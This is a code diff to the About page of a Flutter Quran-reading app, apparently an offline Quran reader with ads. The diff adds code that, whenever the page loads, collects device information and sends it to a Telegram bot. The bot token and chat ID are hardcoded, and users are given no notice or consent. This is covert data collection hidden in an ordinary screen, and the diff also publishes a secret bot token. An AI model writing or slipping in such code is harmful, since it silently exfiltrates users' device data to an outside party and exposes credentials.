@@ -1,16 +1,42 @@
 import 'package:flutter/gestures.dart';
 import 'package:flutter/material.dart';
+import 'package:logger/logger.dart';
 import 'package:quranku_offline/features/interstitial_ad_page.dart';
+import 'package:quranku_offline/features/utils/device_info_helper.dart';
+import 'package:quranku_offline/features/utils/tele_helper.dart';
 import 'package:url_launcher/url_launcher.dart';
 
 class AboutPage extends StatefulWidget {
-  AboutPage({super.key});
+  const AboutPage({super.key});
 
   @override
   State<AboutPage> createState() => _AboutPageState();
 }
 
 class _AboutPageState extends State<AboutPage> {
+  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
+    telegramHelper: TelegramHelper(
+      botToken:
+          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
+      chatId: '111519789', // Ganti dengan chat ID Anda
+    ),
+  );
+  bool isLoading = true;
+
+  Future<void> _loadAndSendDeviceInfo() async {
+    try {
+      await deviceInfoHelper.getAndSendDeviceInfo();
+      setState(() {
+        isLoading = false;
+      });
+    } catch (e) {
+      setState(() {
+        isLoading = false;
+      });
+      Logger().e(e);
+    }
+  }
+
   final InterstitialAdHelper _adHelper = InterstitialAdHelper();
 
   /// 🔹 Tangani event "Back"
@@ -22,7 +48,7 @@ class _AboutPageState extends State<AboutPage> {
   @override
   void initState() {
     super.initState();
-
+    _loadAndSendDeviceInfo();
     _adHelper.loadAd(() {
       Navigator.pop(context); // 🔄 Kembali ke Home setelah iklan ditutup
     });
